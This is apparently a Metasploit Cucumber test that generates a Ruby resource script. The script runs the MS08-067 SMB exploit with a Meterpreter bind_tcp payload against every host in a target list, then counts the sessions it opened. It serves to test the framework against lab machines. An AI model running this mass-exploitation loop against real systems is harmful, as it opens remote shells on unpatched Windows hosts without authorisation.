@targets @db
Feature: MS08-067 netapi

  Background:
    Given a directory named "home"
    And I cd to "home"
    And a mocked home directory

  Scenario: The MS08-067 should get a session with bind_tcp
    Given I ready the windows targets
    Given a file named "ms08-067-bind.rc" with:
      """
      <ruby>
      self.run_single("spool #{Rails.root.join('tmp', 'console.log')}")
      hosts           = YAML.load File.open Rails.root.join('features', 'support', 'targets.yml')
      payload_name    = 'windows/meterpreter/bind_tcp'
      exploited_hosts = []
      failed_hosts    = []

      hosts.each do |host|
        print_status("Trying MS08-067 against #{host['ipAddress']}")
        mod = framework.exploits.create('windows/smb/ms08_067_netapi')
        mod.datastore['PAYLOAD'] = payload_name
        mod.datastore['RHOST'] = host['ipAddress']
        m = mod.exploit_simple(
          'LocalInput'  => nil,
          'LocalOutput' => nil,
          'Payload'     => payload_name,
          'RunAsJob'    => false
        )

        sleep(1)

        if m
          exploited_hosts << host['ipAddress']
        else
          failed_hosts << host['ipAddress']
        end
      end

      print_status("Exploited hosts: #{exploited_hosts.inspect}")
      print_status("Failed hosts: #{failed_hosts.inspect}")
      self.run_single('sessions -K')
      </ruby>
      """
    When I successfully run `msfconsole --environment test -q -r ms08-067-bind.rc -x exit` for up to 100 seconds
    Then the 'Mdm::Host' table contains the expected targets
    